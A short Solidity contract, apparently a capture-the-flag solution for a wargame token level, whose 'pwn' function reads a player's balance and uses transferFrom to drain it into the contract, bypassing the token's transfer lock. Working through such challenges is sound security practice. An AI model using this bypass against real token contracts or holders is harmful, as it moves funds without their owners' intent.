// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin{
    function player() external returns(address);
}

interface IERC20 {
    function balanceOf(address account) external view returns(uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Hack{
    function pwn(IERC20 coin) external{
        address player = INaughtCoin(address(coin)).player();
        uint balance = coin.balanceOf(player);
        coin.transferFrom(player, address(this), balance); 
    }
}